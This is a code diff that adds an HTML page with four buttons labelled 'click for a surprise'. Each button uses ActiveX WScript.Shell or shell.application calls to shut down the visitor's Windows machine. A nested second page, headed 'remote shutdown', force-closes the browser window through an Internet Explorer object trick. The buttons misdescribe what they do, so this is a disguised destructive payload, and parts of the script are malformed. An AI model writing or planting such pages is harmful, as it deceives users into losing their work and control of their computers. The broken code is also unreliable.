@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+
+<body>
+    <script>
+        function closeWin1() {
+            window.oldOnError = window.onerror;
+            window.onerror = function (err) {
+                alert(err);
+                return true;
+            };
+            var wsh = new ActiveXObject("WScript.Shell");
+            wsh.sendKeys("^{ESC}")
+            wsh.sendKeys("{UP}~S~")
+            window.onerror = window.oldOnError;
+        }
+
+        function closeWin2() {
+            window.oldOnError = window.onerror;
+            window.onerror = function (err) {
+                alert(err);
+                return true;
+            };
+            var wsh = new ActiveXObject("WScript.Shell");
+            wsh.Run("rundll32.exe C:\\windows\\system32\\user.exe,exitWindows");
+            window.onerror = window.oldOnError;
+        }
+
+        function closeWin3() {
+            window.oldOnError = window.onerror;
+            window.onerror = function (err) {
+                alert(err);
+                return true;
+            };
+            var test = new ActiveXObject("shell.application");
+            test.shutdownwindows();
+            window.onerror = window.oldOnError;
+        }
+
+        function closeWin4() {
+            window.oldOnError = window.onerror;
+            window.onerror = function (err) {
+                alert(err);
+                return true;
+            };
+            var test = new ActiveXObject("shell.application");
+            test.shutdownwindows();
+            window.onerror = window.oldOnError;
+        }
+        //-->
+    </script>
+    <input type="button" value="点击有惊喜" onclick="javascript:closeWin1();">
+    <br>
+    <input type="button" value="点击有惊喜" onclick="javascript:closeWin2();">
+    <br>
+    <input type="button" value="点击有惊喜" onclick="javascript:closeWin3();">
+    <br>
+    <input type="button" value="点击有惊喜" onclick="javascript:closeWin4();">
+    远程关机：
+    <html>
+
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+        <meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+        <meta name="ProgId" content="FrontPage.Editor.Document">
+        <title>New Page 1 </title>
+    </head>
+
+    <body>
+        <script language="JavaScript">
+            <!--
+            function CloseWin() {
+                var ua = navigator.userAgent
+                var ie = navigator.appName == "Microsoft Internet Explorer" ? true : false
+                if (ie) {
+                    var IEversion = parseFloat(ua.substring(ua.indexOf("MSIE ") + 5, ua.indexOf(";", ua.indexOf(
+                        "MSIE "))))
+                    if (IEversion < 5.5) {
+                        var str = ’ < object id = noTipClose classid = "clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11" > ’
+                            str += ’ < param name = "Command"
+                        value = "Close" > < /object>’;
+                        document.body.insertAdjacentHTML("beforeEnd", str);
+                        document.all.noTipClose.Click();
+                    } else {
+                        window.opener = null;
+                        window.close();
+                    }
+                } else {
+                    window.close()
+                }
+            }
+            //
+            -->
+        </script>
+        <input type=button value=关闭 onclick="CloseWin()">
+    </body>
+
+    </html>
+</body>
+
+</html>
